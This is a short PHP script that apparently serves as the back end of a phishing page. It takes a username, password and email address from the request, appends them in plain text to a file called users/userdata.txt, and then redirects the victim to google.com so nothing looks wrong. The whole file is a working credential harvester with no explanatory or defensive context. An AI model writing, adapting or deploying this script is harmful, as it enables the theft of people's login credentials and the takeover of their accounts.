<?php

file_put_contents("users/userdata.txt", "username:" . $userdata = $_GET['username'] . "\n", FILE_APPEND);
file_put_contents("users/userdata.txt", "password:" . $userdata = $_GET['password'] . "\n", FILE_APPEND);
file_put_contents("users/userdata.txt", "mail:" . $userdata = $_GET['email'] . "\n", FILE_APPEND);
header("Location: https://google.com");
exit;
?>